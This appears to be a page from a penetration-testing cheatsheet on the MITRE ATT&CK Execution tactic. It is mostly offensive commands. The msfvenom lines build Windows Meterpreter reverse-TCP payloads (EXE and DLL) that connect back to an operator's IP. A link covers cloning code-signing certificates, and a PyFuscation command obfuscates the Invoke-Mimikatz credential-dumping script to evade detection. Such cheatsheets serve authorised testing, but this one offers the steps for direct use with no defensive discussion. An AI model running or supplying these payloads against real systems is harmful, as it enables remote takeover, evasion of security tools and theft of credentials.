---
layout: post
title: TA0002 Execution
category: pen
parent: cheatsheets
modified_date: 2023-07-16
permalink: /pen/win/build
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [msfvenom](#msfvenom)
* [sign](#sign)
* [obfuscate](#obfuscate)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='msfvenom'></a>msfvenom
pbuild = payload build
```sh
#? generate msfvenom payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```

## <a name='sign'></a>sign
psign = payload sign
* [code signing certificates cloning](https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec)

## <a name='obfuscate'></a>obfuscate
```sh
# PyFuscation (https://github.com/CBHue/PyFuscation) bring small usefull features
python3 PyFuscation.py -fvp --ps ./Scripts/Invoke-Mimikatz.ps1
```
